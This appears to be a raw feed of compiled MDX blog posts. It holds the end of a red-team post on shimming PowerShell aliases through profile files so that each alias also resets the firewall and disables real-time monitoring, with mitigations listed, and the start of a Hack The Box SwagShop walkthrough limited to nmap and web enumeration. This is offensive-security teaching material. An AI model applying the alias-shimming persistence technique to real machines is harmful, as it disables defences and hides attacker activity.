+  }, &quot;$PROFILE.CurrentUserAllHosts = C:\\Users&quot;, &quot;\\&quot;, &quot;[User]&quot;, &quot;\\Documents\\WindowsPowerShell\\profile.ps1&quot;)), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$PROFILE.AllUserAllHosts = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1&quot;)), mdx(&quot;p&quot;, null, &quot;To write to the latter of the two we need to have administrative permissions\non the box. An interesting tidbit to note is that when PowerShell first runs it will check if the profile for all users has been created and if that doesn\u2019t exist it will use the profile for the current user if it exists.&quot;), mdx(&quot;p&quot;, null, &quot;Keep in mind PowerShell Profiles do not exist by default, you will have to create those files.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;putting-all-the-pieces-together&quot;
+  }, &quot;Putting All the Pieces Together&quot;), mdx(&quot;p&quot;, null, &quot;With so many aliases in PowerShell and having to create the PowerShell Profiles, it could seem daunting to do this manually. Luckily you don\u2019t have to as I created a simple PowerShell script called Remapper which does all of the hard work for you! The only thing you may wish to modify are the functions in the first lines of the script. These funcions are what will be called when an alias is run.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;What the script does:&quot;)), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Get paths of profiles and create them if they don\u2019t exist&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Create a dictionary mapping aliases to shimmed definitions for the majority of aliases.&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Puts the code to rewrite every alias into both PowerShell profiles.&quot;))), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Our shimmed function does four things&quot;), &quot;:&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Do what the alias is originally meant for&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Start a job to restore firewall to default settings&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Start a job to turn off real-time monitoring&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Check if google&quot;, &quot;.&quot;, &quot;com is in the hosts file, if not will add it because during competitions we don\u2019t blue teamers using Google ;).&quot;))), mdx(&quot;p&quot;, null, &quot;Let\u2019s run the script as an administrator and see what happens!&quot;), mdx(&quot;p&quot;, null, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;src&quot;: &quot;/076d38417289bf32775eb32887a02362/demo.gif&quot;,
+    &quot;alt&quot;: &quot;Demo&quot;
+  }))), mdx(&quot;p&quot;, null, &quot;As can be seen, both profiles have been modified and if we do Get-Alias everything has been shimmed. Now when we type an alias it will run our shimmed version of it :)&quot;), mdx(&quot;p&quot;, null, &quot;The script can be found here:\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/NotoriousRebel/Remapper&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Remapper&quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;mitigation&quot;
+  }, &quot;Mitigation&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Monitoring of PowerShell Profile locations to look for either creation of the file or someone writing to it.&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Checking what aliases are defined as&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Avoiding the use of aliases; although, if you dig into PowerShell\u2019s\nsource code you will see some commands use aliases!&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Avoiding Powershell Profiles all together using the flag -No Profile when using PowerShell.&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Powershell Logging &quot;))), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;whats-next&quot;
+  }, &quot;What\u2019s Next?&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Looking into shimming aliases for Command Prompt sessions&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Looking into CLR hooking instead of PowerShell profiles.&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Researching the shimming of built-in PowerShell functions.&quot;))), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;closing-thoughts&quot;
+  }, &quot;Closing Thoughts&quot;), mdx(&quot;p&quot;, null, &quot;The concept of realiasing things in PowerShell is very fascinating, I have not seen too much research on it and would be curious to see just how far you can take it.\nOverall, I hope this blog post gets people interested in the topic and can serve to be another neat trick for red teamers. While also giving blue teamers something else to watch out for.&quot;), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;references&quot;
+  }, &quot;References&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://attack.mitre.org/techniques/T1504/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://attack.mitre.org/techniques/T1504/&quot;))), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_aliases?view=powershell-6&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_aliases?view=powershell-6&quot;))), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6&quot;))), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-6&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-6&quot;))), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6&quot;))), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/remove-alias?view=powershell-6&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/remove-alias?view=powershell-6&quot;)))));
+}
+;
+MDXContent.isMDXComponent = true;</content:encoded></item><item><title><![CDATA[SwagShop Hack The Box Writeup]]></title><description><![CDATA[Complete walkthrough for SwagShop on Hack The Box]]></description><link>https://secbytes.net/SwagShop-Hack-The-Box-Writeup</link><guid isPermaLink="false">https://secbytes.net/SwagShop-Hack-The-Box-Writeup</guid><dc:creator><![CDATA[Bad3r]]></dc:creator><pubDate>Sat, 28 Sep 2019 00:00:00 GMT</pubDate><content:encoded>function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i &lt; arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }
+
+function _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i &lt; sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }
+
+function _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i &lt; sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; target[key] = source[key]; } return target; }
+
+/* @jsx mdx */
+var _frontmatter = {
+  &quot;title&quot;: &quot;SwagShop Hack The Box Writeup&quot;,
+  &quot;author&quot;: &quot;Bad3r&quot;,
+  &quot;date&quot;: &quot;2019-09-28T00:00:00.000Z&quot;,
+  &quot;hero&quot;: &quot;./images/SwagShop_Hack_The_Box_Walkthrough.jpg&quot;,
+  &quot;excerpt&quot;: &quot;Complete walkthrough for SwagShop on Hack The Box&quot;
+};
+
+var makeShortcode = function makeShortcode(name) {
+  return function MDXDefaultShortcode(props) {
+    console.warn(&quot;Component &quot; + name + &quot; was not imported, exported, or provided by MDXProvider as global scope&quot;);
+    return mdx(&quot;div&quot;, props);
+  };
+};
+
+var layoutProps = {
+  _frontmatter: _frontmatter
+};
+var MDXLayout = &quot;wrapper&quot;;
+return function MDXContent(_ref) {
+  var components = _ref.components,
+      props = _objectWithoutProperties(_ref, [&quot;components&quot;]);
+
+  return mdx(MDXLayout, _extends({}, layoutProps, props, {
+    components: components,
+    mdxType: &quot;MDXLayout&quot;
+  }), mdx(&quot;p&quot;, null, &quot;This post documents the complete walkthrough of SwagShop, an active vulnerable VM created by &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://www.hackthebox.eu/home/users/profile/1&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;ch4p&quot;), &quot; and hosted at &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://www.hackthebox.eu/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Hack The Box&quot;)), mdx(&quot;table&quot;, null, mdx(&quot;thead&quot;, {
+    parentName: &quot;table&quot;
+  }, mdx(&quot;tr&quot;, {
+    parentName: &quot;thead&quot;
+  }, mdx(&quot;th&quot;, _extends({
+    parentName: &quot;tr&quot;
+  }, {
+    &quot;align&quot;: null
+  }), &quot;Description&quot;))), mdx(&quot;tbody&quot;, {
+    parentName: &quot;table&quot;
+  }, mdx(&quot;tr&quot;, {
+    parentName: &quot;tbody&quot;
+  }, mdx(&quot;td&quot;, _extends({
+    parentName: &quot;tr&quot;
+  }, {
+    &quot;align&quot;: null
+  }), mdx(&quot;em&quot;, {
+    parentName: &quot;td&quot;
+  }, &quot;SwagShop&quot;), &quot; is a retired GNU/Linux eCommerce web server using an outdated/unpatched version of &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;td&quot;
+  }, &quot;Magento&quot;), &quot; with known vulnerabilities and exploits. The Linux system allows the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;td&quot;
+  }, &quot;Apache&quot;), &quot; user to run a sudo command with no password required, allowing privilege escalation to root.&quot;)))), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;❯-information-gathering&quot;
+  }, &quot;\u276F Information Gathering&quot;), mdx(&quot;p&quot;, null, &quot;Starting with a &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Nmap&quot;), &quot; scan&quot;), mdx(&quot;p&quot;, null, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://notes.secbytes.net/information-gathering/nmap&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Nmap cheat sheet&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C nmap -sV -sC -oA namp 10.10.10.140\n...\n \u2514&gt; PORT   STATE SERVICE VERSION \n    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) \n    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) \n    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) \n    |_http-server-header: Apache/2.4.18 (Ubuntu) \n    |_http-title: Home page Service Info: OS: Linux; \n&quot;)), mdx(&quot;p&quot;, null, &quot;From the SSH flag, we guessed this box to be &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.8&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Ubuntu Xenial&quot;), &quot; and &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Nmap&quot;), &quot; finds &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;80/tcp&quot;), &quot; open.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;❯-web-pages-enumeration&quot;
+  }, &quot;\u276F Web Pages Enumeration&quot;), mdx(&quot;p&quot;, null, &quot;Going to &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;http://10.10.10.140&quot;), &quot; in the browser&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;683px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;62.22547584187408%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA7UlEQVQoz52Ry46CMBRA+f/PGN250h0mupiVE9FEogmiCZNYwAhtSR9AxVYv4J7qSW56Fz29jzqa3szWvZ0O5+g/ieMoioqieNrhaHzVv5PstN/tD9vNJgiCXjbGDMvtveeXOIJzdEFpkiCECKGWNd9yXVUY59AqIYQxJoRomsZ0DMsgZFnGGE/TK85zSqm6320rQxzD0PM8aLeqoY+qLCXnvFbKTj6G67VntG46Hj36YSWv/lbT2RQSWcqyQ8g2gfnhkQHZ9/3FYgkLUgrmbYHDZm2t7Lrzn9EYEs647GpCwPxWbcN6MCYf/XDPC0VwuxlsySgFAAAAAElFTkSuQmCC&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/bfff34f3694a1d39da245647366b7f29/aa8f6/htb_swagshop_web.webp 683w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 683px) 100vw, 683px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/bfff34f3694a1d39da245647366b7f29/08552/htb_swagshop_web.png 683w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 683px) 100vw, 683px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/bfff34f3694a1d39da245647366b7f29/08552/htb_swagshop_web.png&quot;,
+    &quot;alt&quot;: &quot;htb_swagshop_web.png&quot;,
+    &quot;title&quot;: &quot;htb_swagshop_web.png&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;we find a &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Magento&quot;), &quot; shop with some HTB swag available.The pages are copyrighted from 2014, We can see at &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://www.cloudways.com/blog/magento-versions/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;this&quot;), &quot; page that the last released version in 2014 was 1.9.x.&quot;), mdx(&quot;p&quot;, null, &quot;Browsing around, you will notice that the items are placed under a folder called &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;index.php/&quot;), &quot; (&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;http://10.10.10.140/index.php/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;http://10.10.10.140/index.php/&quot;), &quot;)&quot;), mdx(&quot;p&quot;, null, &quot;by running two &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;GoBuster&quot;), &quot; scans on &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;http://10.10.10.140/&quot;), &quot; and &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;http://10.10.10.140/index.php/&quot;), &quot; we find the admin panel at &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;http://10.10.10.140/index.php/admin/&quot;), &quot; &quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1380px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;35.14492753623188%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABVUlEQVQY0yWQyWocQRBE+//1Db775OVmHyywMMgyQmANo1k8Pb2qtq69KmvpkoRKchAkcYjkJdnEEKy1LkafEuRcHdY1vAcJwJ3j3gsAEYKMSaas1iLLs81rSrEx1vbTFF5ekFIdRiNj+75r5/m+bY+UDca2QuzmcXPY3v29+XP94/fl16svH/a3P8vTcwNa09NJxzBivG87oox0sBgzLYIa185o1/UjZT3Cp2HYn/vN7nB39b3b3K7lqUkpA0fyfKPZ7IwMViWwDoILwTjPlVL1Ng81S+MMm+zjYUCICJlzblLOHry2xghsWOf4KMmZcM6kFEpJrYTWhC/jPB7+HbeXHx8+X/z69um4vS+lVHICCCGmtJa4FgfReK+0MkZXW2e0lmxhwzwd2/Oun0+PfCKMS/VOTikAvD3cuYrHCDFKCSGUUowxY6zOhf0X9c7Wdu1X1cVXc8iAdXty5NgAAAAASUVORK5CYII=&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/a1ab70a67e7399044f81c8a25ed2ff06/a305d/admin_login.webp 1380w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1380px) 100vw, 1380px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/a1ab70a67e7399044f81c8a25ed2ff06/23a08/admin_login.png 1380w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1380px) 100vw, 1380px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/a1ab70a67e7399044f81c8a25ed2ff06/23a08/admin_login.png&quot;,
+    &quot;alt&quot;: &quot;admin_login.png&quot;,
+    &quot;title&quot;: &quot;admin_login.png&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;And &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;http://10.10.10.140/downloader/&quot;), &quot; to access &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Magento&quot;), &quot; Connect Manager. You can upload new\n&quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Magento&quot;), &quot; packages, which contains PHP files inside.\n&quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1508px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;66.9761273209549%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABL0lEQVQoz2PQcvLUc/PRcfXWcnRTN9bXNNZTMzFSsXWRt3QQMTDHikQNLfi0jYy9Axkqeib1L1g6YeGytqkzWpsrOppLG9saeuYubpg0PaOuNbO+DRNlNbSn1jTX9E9l+PPnz28Q+v3n79+/////AaJ//4AiYB4+ANQI0vyfLIBFM5D76dOnb9++/QKD379//4IBTJXomn/8+HHv3r1Xr159/vz5IwwA2V+/fgXqJ6D558+fL1++fPb06ePHj0AASD1+/OTpsy9fvgBdQVjzk8ePX7x4+frT97efvr59/+Ht+49v3n34/JkIzb9+/nz1+vX7t28+Xdn14f6Fj5+/fvz4AehyomwGqgBa/uP7t29Pr3978+THz18/wOD79++ENf+DATQuXITIeP5H20QCAP5PsPiu00uiAAAAAElFTkSuQmCC&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/164a418ba9856475415b6ddfdd4c0bb7/c7b4c/downloader_login.webp 1508w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1508px) 100vw, 1508px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/164a418ba9856475415b6ddfdd4c0bb7/4ec8e/downloader_login.png 1508w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1508px) 100vw, 1508px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/164a418ba9856475415b6ddfdd4c0bb7/4ec8e/downloader_login.png&quot;,
+    &quot;alt&quot;: &quot;downloader_login.png&quot;,
+    &quot;title&quot;: &quot;downloader_login.png&quot;,
